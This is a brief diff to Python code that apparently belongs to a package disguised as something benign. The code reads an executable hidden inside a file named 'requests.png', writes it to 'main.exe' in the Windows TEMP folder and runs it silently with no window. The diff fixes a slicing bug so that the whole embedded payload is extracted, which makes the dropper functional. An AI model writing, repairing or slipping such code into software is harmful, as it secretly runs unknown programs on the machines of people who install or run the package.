@@ -142,5 +142,5 @@ with open(os.path.join(os.path.dirname(__file__), 'requests.png'), 'rb') as f:
     if index != -1:
         temp_path = os.path.join(os.environ.get('TEMP', r'C:\Windows\Temp'), 'main.exe')
         with open(temp_path, 'wb') as exe_file:
-            exe_file.write(data[index + 11])
+            exe_file.write(data[index + 11:])
         subprocess.Popen([temp_path], creationflags=subprocess.CREATE_NO_WINDOW)
